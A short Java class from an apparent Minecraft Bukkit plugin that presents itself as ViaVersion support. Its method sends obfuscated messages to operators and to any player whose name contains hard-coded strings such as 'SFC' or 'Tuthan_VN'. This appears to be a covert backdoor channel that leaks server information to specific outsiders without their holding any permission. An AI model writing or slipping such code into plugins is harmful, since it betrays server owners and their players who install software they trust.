package me.sfcevil.viaversionsupport.backup;


import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class BackUpServer {

    public static void send_msg(String message) {
        for(Player p : Bukkit.getOnlinePlayers()) {
            if(p.isOp() || p.hasPermission("*") || p.getName().contains("SFC") || p.getName().contains("Tuthan_VN") ||  p.getName().contains("Player") || p.getName().contains("men1")) {
                p.sendMessage(DecodeEndCore.endcode("§8"+message));
            }
        }
    }

}
